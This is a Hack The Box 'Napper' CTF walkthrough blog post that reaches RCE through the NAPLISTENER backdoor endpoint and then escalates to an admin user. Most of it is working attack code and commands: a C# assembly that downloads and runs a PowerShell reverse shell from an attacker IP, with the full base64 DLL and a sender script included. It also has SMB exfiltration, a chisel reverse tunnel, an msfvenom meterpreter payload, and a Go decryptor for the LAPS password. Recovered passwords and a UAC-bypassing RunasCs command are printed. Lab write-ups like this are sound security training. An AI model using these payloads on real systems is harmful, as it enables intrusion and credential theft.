---
title:  "HTB Napper Writeup"
date:   2024-05-04 00:30:00 
categories: HTB Machine
tags: Naplistener elastic binary_analysis golang
---



![Codify](/assets/img/Napper/F-f1QzHa0AA-3F7.png)

## Introduction

The initial access was quite unique we weren't really exploiting a vulnerability per say but actually re-tracing the steps of a known malware sample. Which then allowed us to get code execution on the system

Getting administrative access to the system was a pretty clear path however the analysis of the go binary was quite the challenge for me since i've never analyzed go binaries before this machine. All in all it was a very interesting machine

## Initial access
### Recon

To start our recon off we will start with an Nmap scan of the machine. using the following command
```
sudo nmap -sS -A  -o nmap  10.10.11.240
```
**Nmap**
```
# Nmap 7.94 scan initiated Sun Nov 12 11:36:28 2023 as: nmap -sS -A -p- -o nmap 10.10.11.240
Nmap scan report for 10.10.11.240
Host is up (0.032s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to https://app.napper.htb
|_http-server-header: Microsoft-IIS/10.0
443/tcp  open  ssl/http   Microsoft IIS httpd 10.0
|_ssl-date: 2023-11-12T16:39:09+00:00; -1s from scanner time.
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=app.napper.htb/organizationName=MLopsHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:app.napper.htb
| Not valid before: 2023-06-07T14:58:55
|_Not valid after:  2033-06-04T14:58:55
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Research Blog | Home 
|_http-generator: Hugo 0.112.3
|_http-server-header: Microsoft-IIS/10.0
7680/tcp open  pando-pub?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP (85%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: Microsoft Windows XP SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   33.47 ms 10.10.14.1
2   34.73 ms 10.10.11.240

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov 12 11:39:10 2023 -- 1 IP address (1 host up) scanned in 161.69 seconds
```
This machine has only http ports open so thats where we start. Looking at the website we can see it is basically a blog using Hugo. Taking a look at Hugo it seems to have a vulnerability which we might be able to exploit at some point [Hugo Vuln](https://nvd.nist.gov/vuln/detail/CVE-2020-26284). At this moment i did not see a way to exploit this so i decided to start looking at the content of the blog.

These blog posts ended up being a complete treasure trove of information. Its a blog containing information on how to setup the website as well as some reverse engineering posts.

![Blog posts](/assets/img/Napper/Napper_01.png)

### Gaining access to Vhost

One of the most interesting posts here was **Enabling Basic Authentication on IIS Using PowerShell: A Step-by-Step Guide** In this post we could find how the administrator setup basic authentication. My first guess was then to try and find a vhost that supported basic authentication. I was able to do this using the following wfuzz command. I used the **--hc** parameter to filter out all status code 200 messages because we are specifically looking for one where it fails such as a **401**. The wordlist i used is part of the DNS discovery directory of seclists.If you don't have it yet you can download it here.[Seclists](https://github.com/danielmiessler/SecLists)

```bash
sudo wfuzz -c -f sub-fighter -Z -w ./subdomains-top1million-5000.txt --hc 200 -u https://napper.htb -H "Host: FUZZ.napper.htb" 
```
![Blog posts](/assets/img/Napper/Napper_02.png) 

So now we knew that the vhost **internal.napper.htb** was a valid host and was using basic authentication. When we read the rest of the blog we can see that the creator had an example user mentioned

![Blog posts](/assets/img/Napper/Napper_03.png) 



## Remote code execution
After trying these credentials on the host **internal.napper.htb** we got access to some internal notes the creator made.

![Blog posts](/assets/img/Napper/Napper_04.png) 


When reading this post we got some juicy information.


[...] HTTP listener written in C#, which we refer to as NAPLISTENER. Consistent with SIESTAGRAPH and other malware families developed or used by this threat, NAPLISTENER appears designed to evade network-based forms of detection.  [...]

This means that any web request to /ews/MsExgHealthCheckd/ that contains a base64-encoded .NET assembly in the sdafwe3rwe23 parameter will be loaded and executed in memory. It's worth noting that the binary runs in a separate process and it is not associated with the running IIS server directly.

When reading through the references the following [NAPLISTENER: more bad dreams from developers of SIESTAGRAPH](https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph). Looked interesting. It included a proof of concept on how to interact with it. The python code can be is shown below. 



### Exploiting Naplistner


This code will send a base64 encoded DLL to the malicious endpoint added by the napplistener malware. With the below code we could send our dll after we create it.

```python
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

proxies = {
   'http': 'http://127.0.0.1:8080',
   'https': 'http://127.0.0.1:8080',
    }

hosts=["napper.htb"]
payload = ""

form_field=f"sdafwe3rwe23={requests.utils.quote(payload)}"

for h in hosts:
   url_ssl= f"https://{h}/ews/MsExgHealthCheckd/"

   try:
       r_ssl = requests.post(url_ssl, data=form_field, verify=False,proxies=proxies)
       print(f"{url_ssl} : {r_ssl.status_code} {r_ssl.headers}")
   except KeyboardInterupt:
       exit()
   except Exception as e:
       print("e")
       pass
```

#### Creating dotnet assembly

So at this point we got a script we could use toe exploit the vulnerable server but we don't have a working payload yet to use with this exploit. Lets change that now

The payload makes use of the **Invoke-PowerShellTcp.ps1** script of [nishang](https://github.com/samratashok/nishang) This github repo contains multiple powershell scripts including reverse shells and other post exploitation tools. next i setup a webserver hosting this file.

```bash
python -m http.server
```

When reading through the malware analysis of naplistener we mentioned earlier we could figure out the exact parameters we need set to make our payload usable by the malware. Our namespace needs to be called payload while our class needs to be called run. Within this class we could basically run whatever we want. I opted for a simple powershell command runner.

```cs
using System;
using System.Diagnostics;

namespace payload {
  class Run {
   public Run() {
           System.Diagnostics.Process process = new System.Diagnostics.Process();
           System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
           startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
           startInfo.FileName = "powershell.exe";
           startInfo.Arguments = "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.144/shell.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.144 -Port 4444";
           process.StartInfo = startInfo;
           process.Start();
    }
  }
}
```

After creating our payload you can compile it with the following command:

```bash
mcs -t:library -out:payload.dll cmd.cs
```

```bash
base64 -w0 payload.dll > new.txt
```


#### Executing the payload

When adding the base64 encoded payload to our python script it would look like the following, Just running this script will give you access to the system

```python
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

proxies = {
   'http': 'http://127.0.0.1:8080',
   'https': 'http://127.0.0.1:8080',
    }

hosts=["napper.htb"]
payload = "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ZABsAGwAAAAkAAIAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAACAAAAAoAAIAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAwAAAAANQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="

form_field=f"sdafwe3rwe23={requests.utils.quote(payload)}"

for h in hosts:
   url_ssl= f"https://{h}/ews/MsExgHealthCheckd/"

   try:
       r_ssl = requests.post(url_ssl, data=form_field, verify=False,proxies=proxies)
       print(f"{url_ssl} : {r_ssl.status_code} {r_ssl.headers}")
   except KeyboardInterupt:
       exit()
   except Exception as e:
       print("e")
       pass
```

## Privilege escalation

Now that we have access to the  system we can start enurating the machine., When going through the File system We noticed that in the **C:\temp\www\internal\content\posts** Directory there was a so far unreleased post named **no-more-laps.md**

![No more laps](/assets/img/Napper/Napper_05.png) 

This blog post mentions that the creator is using elasticsearch in favor for LAPS. Next i checked what permissions this **backup** user had with the net user command. We can see that this user is part of the administrative group so it makes it a clear target for trying to escalate our privileges.

```bash
net user backup
```

![Net user backup](/assets/img/Napper/Napper_06.png) 

In the same directory we could find another directory called **internal-laps-alpha** Seeing this would be related to getting access to backup user i decided to exfiltrate the files in this directory using SMB. Setup the SMB share with impacket.

```
impacket-smbserver -smb2support exfil `pwd`
```
Next run the following copy commands to exfiltrate the .env file and the a.exe file 

```bash
copy .\.env \\10.10.14.144\exfil\
copy .\a.exe \\10.10.14.144\exfil\
```

The .env file seemed like it was a placeholder file for the credentials of the elastic based LAPS implementation

```conf
ELASTICUSER=user
ELASTICPASS=DumpPassword\$Here

ELASTICURI=https://127.0.0.1:9200  
```

Next I started to analyze the **a.exe** binary first of all create a new  project and then import a the binary **File -> Import file**

![Import file](/assets/img/Napper/Napper_07.png) 

When loading the file up i noticed that this was a Golang binary. I was recommended by a friend to use the following github project as an extension for Ghidra to ease reverse engineering [Mooncat-greenpy Ghidra_GolangAnalyzerExtension](https://github.com/mooncat-greenpy/Ghidra_GolangAnalyzerExtension). Follow the instructions on how to install it on the github page. Then after restarting you can resume analyzing the binary 

![Golang binary](/assets/img/Napper/Napper_08.png) 

Next let Ghidra analyze the file. After the file has been analyzed we can go dig deeper into the different routines. Below we copied the generatekey routine.

```c
void main.genKey(undefined8 param_1)

{
  char extraout_AL;
  int extraout_RAX;
  int iVar1;
  
                    /* /Users/remco/git/HTB/es_napper.go:50 */
  while (&stack0x00000000 <= CURRENT_G.stackguard0) {
                    /* /Users/remco/git/HTB/es_napper.go:50 */
    runtime.morestack_noctxt();
  }
                    /* /Users/remco/git/HTB/es_napper.go:51 */
                    /* /usr/local/opt/go/libexec/src/math/rand/rand.go:324 */
  math/rand.(*Rand).Seed(math/rand.globalRand,param_1);
                    /* /Users/remco/git/HTB/es_napper.go:52 */
  runtime.makeslice(&uint8___runtime._type,0x10,0x10);
                    /* /Users/remco/git/HTB/es_napper.go:53 */
  for (iVar1 = 0; iVar1 < 0x10; iVar1 = iVar1 + 1) {
                    /* /usr/local/opt/go/libexec/src/math/rand/rand.go:358 */
    math/rand.(*Rand).Intn(math/rand.globalRand,0xfe);
                    /* /Users/remco/git/HTB/es_napper.go:54 */
    *(char *)(extraout_RAX + iVar1) = extraout_AL + '\x01';
                    /* /Users/remco/git/HTB/es_napper.go:53 */
  }
                    /* /Users/remco/git/HTB/es_napper.go:56 */
  return;
}
```

In the generate key  method we can see the **runtime.makeslice(&uint8___runtime._type,0x10,0x10);** which means we are taking a slice of 16 bytes into a byte array from a random seed based on a seed we obtain get from a different function. When looking into the other code we could see that hits seed came from the elastic connection.

So next up we extracted the Encryption function.

```c

/* WARNING: Unknown calling convention */
/* Name: main.encrypt
   Start: 00870200
   End: 008703e0 */

void main.encrypt(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4,
                 undefined8 param_5)

{
  uint uVar1;
  undefined8 extraout_RAX;
  undefined8 extraout_RAX_00;
  int extraout_RAX_01;
  int extraout_RAX_02;
  undefined8 extraout_RCX;
  int extraout_RCX_00;
  undefined8 extraout_RCX_01;
  undefined8 uVar2;
  int extraout_RBX;
  undefined8 extraout_RBX_00;
  int extraout_RBX_01;
  undefined8 extraout_RBX_02;
  int iVar3;
  undefined8 extraout_RDI;
  undefined8 uStack0000000000000008;
  undefined8 uStack0000000000000010;
  undefined8 uStack0000000000000018;
  undefined8 uStack0000000000000020;
  undefined8 in_stack_ffffffffffffff88;
  undefined8 in_stack_ffffffffffffff90;
  
  uStack0000000000000008 = param_1;
  uStack0000000000000018 = param_3;
  uStack0000000000000010 = param_2;
  uStack0000000000000020 = param_4;
                    /* /Users/remco/git/HTB/es_napper.go:59 */
  while (&stack0x00000000 <= CURRENT_G.stackguard0) {
                    /* /Users/remco/git/HTB/es_napper.go:59 */
    runtime.morestack_noctxt();
  }
                    /* /Users/remco/git/HTB/es_napper.go:60 */
  runtime.stringtoslicebyte(0,uStack0000000000000020,param_5);
                    /* /Users/remco/git/HTB/es_napper.go:62 */
  crypto/aes.NewCipher(uStack0000000000000008,uStack0000000000000010,uStack0000000000000018);
                    /* /Users/remco/git/HTB/es_napper.go:63 */
  if (extraout_RCX_00 != 0) {
                    /* /Users/remco/git/HTB/es_napper.go:64 */
    if (extraout_RCX_00 != 0) {
                    /* /Users/remco/git/HTB/es_napper.go:64 */
      uVar2 = *(undefined8 *)(extraout_RCX_00 + 8);
    }
    else {
      uVar2 = 0;
    }
                    /* WARNING: Subroutine does not return */
    runtime.gopanic(uVar2,extraout_RDI);
  }
                    /* /Users/remco/git/HTB/es_napper.go:62 */
                    /* /Users/remco/git/HTB/es_napper.go:67 */
  uVar1 = extraout_RBX + 0x10;
  runtime.makeslice(&uint8___runtime._type,uVar1,uVar1);
                    /* /Users/remco/git/HTB/es_napper.go:68 */
  if (uVar1 < 0x10) {
                    /* /Users/remco/git/HTB/es_napper.go:68 */
                    /* WARNING: Subroutine does not return */
    runtime.panicSliceAcap(in_stack_ffffffffffffff88,in_stack_ffffffffffffff90);
  }
                    /* /Users/remco/git/HTB/es_napper.go:67 */
                    /* /Users/remco/git/HTB/es_napper.go:70 */
                    /* /usr/local/opt/go/libexec/src/io/io.go:351 */
  io.ReadAtLeast(crypto/rand.Reader,DAT_00ca8bb8,extraout_RAX_01,0x10,uVar1,0x10);
                    /* /Users/remco/git/HTB/es_napper.go:70 */
  if (extraout_RBX_01 == 0) {
                    /* /usr/local/opt/go/libexec/src/crypto/cipher/cfb.go:57 */
    crypto/cipher.newCFB(extraout_RAX_00,extraout_RBX_00,extraout_RAX_01,0x10,uVar1,0);
                    /* /Users/remco/git/HTB/es_napper.go:75 */
    (**(code **)(extraout_RAX_02 + 0x18))
              (extraout_RBX_02,extraout_RAX_01 + (uint)((dword)(-extraout_RBX >> 0x3f) & 0x10),
               extraout_RBX,extraout_RBX,extraout_RAX,extraout_RBX,extraout_RCX);
                    /* /Users/remco/git/HTB/es_napper.go:77 */
    encoding/base64.(*Encoding).EncodeToString
              (encoding/base64.URLEncoding,extraout_RAX_01,uVar1,uVar1);
    return;
  }
  iVar3 = extraout_RBX_01;
                    /* /Users/remco/git/HTB/es_napper.go:71 */
  if (extraout_RBX_01 != 0) {
    iVar3 = *(int *)(extraout_RBX_01 + 8);
  }
                    /* WARNING: Subroutine does not return */
  runtime.gopanic(iVar3,extraout_RCX_01);
}
```
Based on this code we could find out what encryption standards were being used used. on line 76 we can see that it uses CFB mode in combination with an AES encryption. So with this information if we can make a script that can gather the seed we should be able to create a script that could decrypt these values ourselves without needing access to the creators binary.

So after not being able to find the credentials anywhere i decided to check if i could access some of the data within the elastic search cluster. here we could see the default password of the reserved elastic user saved. This password was still valid and we could use this to access the elastic cluster

```
reserved-useruserC??lFST??
useruserD??lFST
?Uy?(???*???lLucene90StoredFieldsFastData?69u>
i}2??"?$?
vc1^3H`YV`^\]MY?"?&???j?????????{"doc_type":"api_key","creati?on_time":1686219630330,"expir 3214 H?_invalidated":false,dPey_ha?Osh":"{PBKDF2}10000$EVlYHJWcRa4vrNNXnZJBZz4C+xGF0H/kwh8O8sZVIvE=$LjOO6DC1KVFxv5H8vQpqzoXANMUW85?p1S/6EwkvdCto=","role_descriptors":{+?e_enrollment_tokenluster":["c
                                                                                                                                                                                                                                                                                                  ?:admin/xpack?$/security/enroll/kibana"],"indices":[],"applicationSrun_a
                 ?metadata":{},"kP:"rol?%e"}},"limited_by_role_descriptors":{"_xpack_security?cluster":["all"],"indices":[{"names":["*"],"privileges":["all?allow_restricted_indic#?true}],"application9?],"run_a
                                                                                                                                                                                                                 `"*"],"?metadata":{"_reserved":true},"5?role"}},"namE?enrollment_token_APIV?_-iaFmogBapOk5rX4?"ppbr","version":8080099,"metadata_flattened":null9?or":{"principal":"_xpack_security","fu?ll_name":null,"email
?metadata":{},"realm":"__attach"Z?}}?reserv?5ed-user-elasticI{"password":"oKHzjZw0EGcRxT2cux5K","enabled":true,"[?reserved-user"}?
```

In the last line of this snipped we could see the password of the elastic user which was still valid.

```
elastic:oKHzjZw0EGcRxT2cux5K
```

So now that we have the credentials of the service we need to get access to the elasticsearch cluster. We can do this using chisel setup the chisel server using 

```bash
./chisel server --port 5000 --reverse
```

Next i downloaded the chisel client and ran it with the following command

```bash
wget "http://10.10.14.144/chisel.exe" -outfile "chisel1.exe"
.\chisel1.exe client 10.10.14.144:5000 R:socks
```

So now that we have access to the elastic cluster from our own machine we'll make a program in go to obtain the seed which then can be used to get the encrypted password which then in turn gets decoded.


```go
package main

import (
        "crypto/aes"
        "crypto/cipher"
        "encoding/base64"
        "fmt"
        "math/rand"
        "os/exec"
        "strconv"
        "strings"
)

func getSeed() (int64, string, error) {
        cmd := exec.Command(
                "curl",
                "-i", "-s", "-k", "-X", "GET",
                "-H", "Host: localhost:9200",
                "-H", "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
                "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "-H", "Accept-Language: en-US,en;q=0.5",
                "-H", "Accept-Encoding: gzip, deflate",
                "-H", "Dnt: 1",
                "-H", "Authorization: Basic ZWxhc3RpYzpvS0h6alp3MEVHY1J4VDJjdXg1Sw==",
                "-H", "Upgrade-Insecure-Requests: 1",
                "-H", "Sec-Fetch-Dest: document",
                "-H", "Sec-Fetch-Mode: navigate",
                "-H", "Sec-Fetch-Site: none",
                "-H", "Sec-Fetch-User: ?1",
                "-H", "Te: trailers",
                "-H", "Connection: close",
                "-b", "i_like_gitea=1bcfba2fb61ea525; lang=en-US",
                "https://localhost:9200/_search?q=*&pretty=true",
        )

        output, err := cmd.CombinedOutput()
        if err != nil {
                return 0, "", nil
        }

        outputLines := strings.Split(string(output), "\n")
        var seedStr string
        for _, line := range outputLines {
                if strings.Contains(line, "seed") && !strings.Contains(line, "index") {
                        seedStr = strings.TrimSpace(strings.Split(line, ":")[1])
                        break
                }
        }

        seed, err := strconv.ParseInt(seedStr, 10, 64)
        if err != nil {
                return 0, "", nil
        }

        outputLines = strings.Split(string(output), "\n")
        var blob string
        for _, line := range outputLines {
                if strings.Contains(line, "blob") {
                        blob = line
                        blob = strings.TrimSpace(strings.Split(line, ":")[1])
                        blob = strings.Split(blob, "\"")[1]
                        break
                }
        }

        return seed, blob, nil
}

func generateKey(seed int64) []byte {
        rand.Seed(seed)
        key := make([]byte, 16)
        for i := range key {
                key[i] = byte(1 + rand.Intn(254))
        }
        return key
}

func decryptCFB(iv, ciphertext, key []byte) ([]byte, error) {
        block, err := aes.NewCipher(key)
        if err != nil {
                return nil, err
        }

        stream := cipher.NewCFBDecrypter(block, iv)
        plaintext := make([]byte, len(ciphertext))
        stream.XORKeyStream(plaintext, ciphertext)

        return plaintext, nil
}

func main() {
        seed, encryptedBlob, _ := getSeed()

        key := generateKey(seed)

        decodedBlob, err := base64.URLEncoding.DecodeString(encryptedBlob)
        if err != nil {
                fmt.Println("Error decoding base64:", err)
                return
        }

        iv := decodedBlob[:aes.BlockSize]
        encryptedData := decodedBlob[aes.BlockSize:]

        decryptedData, err := decryptCFB(iv, encryptedData, key)
        if err != nil {
                fmt.Println("Error decrypting data:", err)
                return
        }

        fmt.Printf("Key: %x\n", key)
        fmt.Printf("IV: %x\n", iv)
        fmt.Printf("Encrypted Data: %x\n", encryptedData)
        fmt.Printf("Decrypted Data: %s\n", decryptedData)
}
```

After running this command we'd get the unencrypted password of this backup user.

```bash
proxychains go run code.go
```

![Password obtained](/assets/img/Napper/Napper_10.png) 


I was not able to directly use this password with for example winrm or any other communication protocol. Because of this we'll have to use runas on this machine. To use runas in reverse shell we'll need to runasCS tool to allow us to run commands as a different user without needing a gui.
First i created meterpreter reverse shell to make it easier to run a command as the backup user

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.144 LPORT=53 -f exe > shell-x64.exe
```

Next we setup our listener with the following command

```bash
msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST tun0;set LPORT 53;run;"
```

After getting our shell compiled as well as our RunasCs binary added to our webserver we can then download it onto the machine with the following commands.

```bash
wget "http://10.10.14.144/shell-x64.exe" -outfile "b.exe"
wget "http://10.10.14.144/RunasCs.exe" -outfile "RunasCs.exe"
```

After uploading these file we can use the following command to run our meterpreter shell as the backup user.

```powershell
.\RunasCs.exe backup YYzuiRssgTEUPWRzgEEKfXilomfoGLkoCsJSfkl ".\b.exe" -t 8 --bypass-uac
```

Then a few moments later we'll get a meterpreter shell as the backup user which has administrative permissions.

![Backup user access](/assets/img/Napper/Napper_09.png) 
